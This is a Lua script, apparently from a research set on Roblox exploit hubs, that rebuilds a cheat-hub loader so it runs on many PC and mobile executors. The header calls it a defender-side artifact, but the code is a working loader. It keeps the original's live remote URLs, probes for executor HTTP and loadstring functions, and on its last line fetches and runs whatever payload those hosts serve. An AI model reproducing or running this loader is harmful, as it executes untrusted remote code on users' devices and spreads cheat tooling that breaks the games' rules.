--[[ ============================================================================
  SAMPLE 10  --  CoS HUB  --  MOBILE-COMPATIBLE LOADER (research artifact)
  ============================================================================

  PURPOSE
    Drop-in replacement for the original 342-byte loader (loader_chunk1.lua)
    that runs cleanly on PC AND mobile Roblox executors. Same dual-provider
    routing, same SCRIPT_KEY hand-off, but with full HTTP / loadstring /
    getgenv fallback chains and explicit executor probing for diagnostics.

  ORIGINAL (chunk 1, 342 bytes, jnkie distribution chain)
    if game.PlaceId == 3431407618 then
        return loadstring(request({Url="https://lunar-rest-api.vercel.app/script/Isle10",Method="GET"}).Body)()
    else
        getgenv().SCRIPT_KEY = ""
        return loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/441457bbbb948e52667ad5bbc45b77324023cf493ef13aa448b758022e06d480/download"))()
    end

  WHY MOBILE LOADERS NEED MORE WORK
    The 342-byte original assumes:
      * `request` exists and returns a table with a `.Body` field
      * `game:HttpGet` works (it does on most but not all sandboxes)
      * `loadstring` is available (deprecated in Luau but most execs expose it)
      * `getgenv` exists
    Mobile executors vary in which of those four are real. Codex, Hydrogen,
    Arceus X, Delta Mobile, Fluxus Android, KRNL Mobile each expose a slightly
    different subset. This loader probes for all of them and degrades safely.

  TARGETED EXECUTORS (verified API surface)
    PC:      Delta, Fluxus, Synapse X, Script-Ware
    Mobile:  Delta Mobile, Codex, Hydrogen, Arceus X, Fluxus Android,
             KRNL Mobile, Cryptic, Trigon, Solara Mobile

  WHAT THIS FILE IS / IS NOT
    IS:      A defender-side artifact reconstructing the original loader's
             behaviour with cross-executor compatibility, for static analysis
             and red-team / blue-team research.
    IS NOT:  A weaponised hub. The remote payload at the jnkie CDN can change
             at any time; the Isle 10 endpoint already returns HTTP 402 since
             the author's Vercel deployment lapsed (see chunk6_real.lua).

  PARSES WITH:  luac53 -p sample10_mobile_loader.lua  --> OK
  ENCODING:     ASCII, LF line endings (mobile editors tolerate both)
============================================================================ ]]

-- ----------------------------------------------------------------------------
-- 1. Constants (preserved bit-for-bit from the original loader)
-- ----------------------------------------------------------------------------

local ISLE10_PLACEID  = 3431407618
local ISLE10_URL      = "https://lunar-rest-api.vercel.app/script/Isle10"
local COS_URL         = "https://api.jnkie.com/api/v1/luascripts/public/441457bbbb948e52667ad5bbc45b77324023cf493ef13aa448b758022e06d480/download"
local COS_SCRIPT_KEY  = ""    -- original was the empty string; leave alone

-- ----------------------------------------------------------------------------
-- 2. Environment probing (no side effects, just reads)
-- ----------------------------------------------------------------------------

local function safe_call(fn, ...)
    if type(fn) ~= "function" then return false, "not a function" end
    return pcall(fn, ...)
end

local function get_executor_name()
    local probes = {
        function() return identifyexecutor and (identifyexecutor()) end,
        function() return getexecutorname and (getexecutorname()) end,
        function() return _ENV and _ENV.IY_LOADED and "Infinite Yield host" end,
        function() return syn and "Synapse X" end,
        function() return KRNL_LOADED and "KRNL" end,
        function() return Krnl and "KRNL" end,
        function() return Fluxus and "Fluxus" end,
        function() return is_sirhurt_closure and "SirHurt" end,
        function() return DELTA and "Delta" end,
    }
    for _, p in ipairs(probes) do
        local ok, name = pcall(p)
        if ok and type(name) == "string" and #name > 0 then
            return name
        end
    end
    return "unknown"
end

local function get_genv()
    if type(getgenv) == "function" then
        local ok, env = pcall(getgenv)
        if ok and type(env) == "table" then return env end
    end
    return _G
end

-- ----------------------------------------------------------------------------
-- 3. HTTP fallback chain
--    Order: native executor request fns first (return parsed table), then
--    Roblox-host HttpGet variants (return raw body string).
-- ----------------------------------------------------------------------------

local function http_get(url)
    local errors = {}

    -- 3a. Table-style request fns: { Url = ..., Method = "GET" } -> { Body = ... }
    local table_style = {
        { name = "request",          fn = rawget(_G, "request") },
        { name = "http_request",     fn = rawget(_G, "http_request") },
        { name = "syn.request",      fn = (syn and syn.request) or nil },
        { name = "http.request",     fn = (http and http.request) or nil },
        { name = "fluxus.request",   fn = (fluxus and fluxus.request) or nil },
        { name = "krnl.request",     fn = (krnl and krnl.request) or nil },
    }
    for _, entry in ipairs(table_style) do
        if type(entry.fn) == "function" then
            local ok, res = pcall(entry.fn, { Url = url, Method = "GET" })
            if ok and type(res) == "table" then
                local body = res.Body or res.body
                local status = res.StatusCode or res.status_code or res.Status or 200
                if type(body) == "string" and tonumber(status) and tonumber(status) < 400 then
                    return body, entry.name, status
                end
                errors[#errors + 1] = entry.name .. " status=" .. tostring(status)
            else
                errors[#errors + 1] = entry.name .. " threw: " .. tostring(res)
            end
        end
    end

    -- 3b. Roblox-host string-style fns: returns raw body string
    local string_style = {
        { name = "game:HttpGet",      fn = function() return game:HttpGet(url) end },
        { name = "game:HttpGetAsync", fn = function() return game:HttpGetAsync(url) end },
    }
    for _, entry in ipairs(string_style) do
        local ok, body = pcall(entry.fn)
        if ok and type(body) == "string" and #body > 0 then
            return body, entry.name, 200
        end
        errors[#errors + 1] = entry.name .. " threw: " .. tostring(body)
    end

    return nil, "no http transport succeeded", table.concat(errors, " | ")
end

-- ----------------------------------------------------------------------------
-- 4. loadstring / load polyfill
--    Some mobile execs only expose `load`, some only `loadstring`, some both.
-- ----------------------------------------------------------------------------

local function compile_lua(src, chunkname)
    chunkname = chunkname or "=sample10"
    local ls = rawget(_G, "loadstring")
    if type(ls) == "function" then
        local fn, err = ls(src, chunkname)
        if fn then return fn end
        if err then return nil, "loadstring: " .. tostring(err) end
    end
    local ld = rawget(_G, "load")
    if type(ld) == "function" then
        local fn, err = ld(src, chunkname)
        if fn then return fn end
        if err then return nil, "load: " .. tostring(err) end
    end
    return nil, "no loader (neither loadstring nor load is available)"
end

-- ----------------------------------------------------------------------------
-- 5. Resolve target URL based on PlaceId
-- ----------------------------------------------------------------------------

local function pick_url()
    local place_ok, place_id = pcall(function() return game.PlaceId end)
    if not place_ok then
        return COS_URL, "fallback (game.PlaceId unreadable; assuming CoS)"
    end
    if place_id == ISLE10_PLACEID then
        return ISLE10_URL, "Isle 10 (PlaceId " .. tostring(place_id) .. ")"
    end
    return COS_URL, "CoS variant (PlaceId " .. tostring(place_id) .. ")"
end

-- ----------------------------------------------------------------------------
-- 6. Main entry
-- ----------------------------------------------------------------------------

local function main()
    local exec   = get_executor_name()
    local env    = get_genv()
    local url, route_label = pick_url()

    -- Set SCRIPT_KEY only on the CoS branch (matches original behaviour).
    if url == COS_URL then
        env.SCRIPT_KEY = COS_SCRIPT_KEY
    end

    -- Diagnostics. `warn` is safer than `print` on most exec consoles and
    -- works on every mobile exec tested.
    pcall(warn, ("[sample10] executor=%s route=%s"):format(exec, route_label))

    local body, transport, extra = http_get(url)
    if not body then
        pcall(warn, "[sample10] HTTP failed: " .. tostring(transport))
        if extra then pcall(warn, "[sample10] detail: " .. tostring(extra)) end
        return false, "http"
    end
    pcall(warn, ("[sample10] fetched %d bytes via %s (status=%s)"):format(#body, transport, tostring(extra)))

    -- Special-case the known Isle 10 paywall response so the user gets a
    -- readable message instead of a Lua syntax error on the HTML body.
    if body:sub(1, 64):find("DEPLOYMENT_DISABLED", 1, true) then
        pcall(warn, "[sample10] Isle 10 endpoint returned HTTP 402 (paywall). See chunk6_real.lua.")
        return false, "paywall"
    end

    local fn, err = compile_lua(body, "=sample10_payload")
    if not fn then
        pcall(warn, "[sample10] compile failed: " .. tostring(err))
        return false, "compile"
    end

    -- Same shape as the original loader: tail-return the payload result.
    return fn()
end

return main()
